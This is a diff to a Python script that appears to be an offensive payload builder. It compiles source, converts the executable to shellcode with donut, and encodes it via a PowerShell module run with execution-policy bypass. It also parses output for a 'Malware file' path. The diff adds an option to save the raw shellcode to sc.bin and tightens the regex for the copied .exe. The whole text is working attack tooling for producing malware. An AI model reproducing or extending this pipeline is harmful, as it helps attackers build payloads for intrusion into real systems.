@@ -28,6 +28,11 @@ print("[+] Source compiled!")
 donut_cmd = r"{}\donut_v0.9.3\donut.exe -a 2 -o {}\temp.bin {}\temp.exe".format(cwd,cwd,cwd)
 do = subprocess.check_output(donut_cmd)
 
+if len(sys.argv) == 3:
+    if sys.argv[2] == "save":
+        do2 = subprocess.check_output(r"cmd /c copy /y {}\temp.bin {}\sc.bin".format(cwd,cwd))
+        print("[!] Shellcode saved as: {}".format(cwd+"\sc.bin"))
+
 # encode/compress
 ps_cmd = r"""powershell -exec bypass -c "Import-Module {}\Get-CS.ps1;  Get-CS -inFile {}\temp.bin -outFile {}\temp.b64" """.\
     format(cwd, cwd, cwd)
@@ -66,9 +71,11 @@ if err:
     print(err.decode())
     sys.exit(1)
 else:
-    a = re.findall(r"Copying file from [^ ]* to \"C:",out.decode())
+    a = re.findall(r"Copying file from [^ ]*exe\" to \"C:", out.decode())
     if a:
         print("[+] Malware file: {}".format(a[0].split('"')[1]))
+    else:
+        print(out.decode())
 
     print("[!] Cleanup.")
     _ = subprocess.Popen(r"del {}\temp*".format(cwd),shell=True)
